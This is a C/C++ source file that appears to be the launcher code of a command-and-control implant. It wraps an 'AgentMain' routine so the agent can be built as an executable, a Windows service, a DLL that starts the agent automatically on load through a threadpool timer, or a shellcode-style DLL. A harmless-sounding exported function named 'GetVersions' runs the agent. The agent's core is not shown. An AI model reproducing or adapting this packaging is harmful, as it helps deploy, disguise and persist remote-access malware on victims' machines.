#include "main.h"
#include "config.h"

#if defined(DEBUG)

int main()
{
    AgentMain(NULL);
    return 0;
}

#elif defined(BUILD_SVC)

SERVICE_STATUS        ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

void ServiceMain(int argc, char** argv)
{
    CHAR* SvcName = getServiceName();
    hStatus = RegisterServiceCtrlHandlerA(SvcName, (LPHANDLER_FUNCTION)ControlHandler);
    if (!hStatus)
        return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    AgentMain(NULL);

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }

    SetServiceStatus(hStatus, &ServiceStatus);
}

extern "C" void AxRawSvcEntry(void)
{
	SERVICE_TABLE_ENTRYA ServiceTable[2];
	CHAR* SvcName = getServiceName();
	ServiceTable[0].lpServiceName = (LPSTR)SvcName;
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;

	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;

	StartServiceCtrlDispatcherA(ServiceTable);
}

int main()
{
	AxRawSvcEntry();
	return 0;
}

#elif defined(BUILD_DLL)

#define _WIN32_WINNT 0x0600
#include <threadpoolapiset.h>

static volatile LONG g_AgentInitialized = FALSE;
static volatile LONG g_LockInitialized = FALSE;
static CRITICAL_SECTION g_InitLock;

void InitializeSynchronization()
{
    if (InterlockedCompareExchange(&g_LockInitialized, TRUE, FALSE) == FALSE)
        InitializeCriticalSection(&g_InitLock);
}

void run()
{
    InitializeSynchronization();

    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        HANDLE hThread = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
        if (hThread)
            CloseHandle(hThread);
        else
            InterlockedExchange(&g_AgentInitialized, FALSE);
    }
}

extern "C" __attribute__((dllexport)) void CALLBACK GetVersions(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    InitializeSynchronization();

    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        HANDLE hThread = CreateThread(NULL, 0, AgentMain, NULL, 0, NULL);
        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
    }
}

VOID CALLBACK InitializationCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
{
    CloseThreadpoolTimer(Timer);
    run();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    {
        InitializeSynchronization();
        PTP_TIMER timer = CreateThreadpoolTimer(InitializationCallback, NULL, NULL);
        if (timer) {
            FILETIME dueTime = { 0 };
            SetThreadpoolTimer(timer, &dueTime, 0, 0);
        }
        break;
    }
    case DLL_PROCESS_DETACH:
        if (!lpReserved && g_LockInitialized)
            DeleteCriticalSection(&g_InitLock);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

#elif defined(BUILD_SHELLCODE)

__attribute__((dllexport)) void GetVersions() {};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    AgentMain(NULL);
    return TRUE;
}
#else

extern "C" int AxRawExeEntry(void)
{
	AgentMain(NULL);
	return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	(void)hInstance;
	(void)hPrevInstance;
	(void)lpCmdLine;
	(void)nCmdShow;
	return AxRawExeEntry();
}

#endif
